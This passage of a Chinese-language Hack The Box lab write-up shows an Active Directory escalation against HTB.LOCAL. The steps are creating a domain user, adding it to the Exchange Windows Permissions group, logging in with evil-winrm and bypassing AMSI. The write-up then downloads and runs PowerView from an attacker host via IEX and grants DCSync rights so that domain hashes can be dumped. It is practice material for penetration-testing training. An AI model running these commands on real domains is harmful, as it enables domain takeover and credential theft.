Shell as User - newboy

  • 标记已有账号为 Owned，搜索到达 HTB.LOCAL 的路径

  • svc-alfresco 属于 Account Operators 组
  • Exchange Windows Permissions 组有 WriteDacl 权限且不受保护

因此可以通过 svc-alfresco 用户创建新用户，并将其添加到 Exchange Windows Permissions 组，然后利用 Exchange Windows Permissions 组的 WriteDacl 权限修改用户 ACEs ，赋予 DCSync 权限，Dump Hash

  • 添加新用户 newboy，添加到所需用户组
net user newboy Admin@123 /add /domain
net group "Exchange Windows Permissions" newboy /add
net localgroup "Remote Management Users" newboy /add
  • 登录 newboy 用户 evil-winrm -i $IP -u 'newboy' -p 'Admin@123' -s .

Shell as Root

  • newboy 用户赋予自己 DCSync 权限
[*Evil-WinRM* PS C:\> ]
Bypass-4MSI
IEX(New-Object Net.WebClient).DownloadString("http://10.10.16.18/PowerView.ps1")
# 添加 DCSync 权限
Add-ObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity newboy -Rights DCSync -Verbose

# 删除 DCSync 权限
Remove-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity newboy -Rights DCSync -Verbose
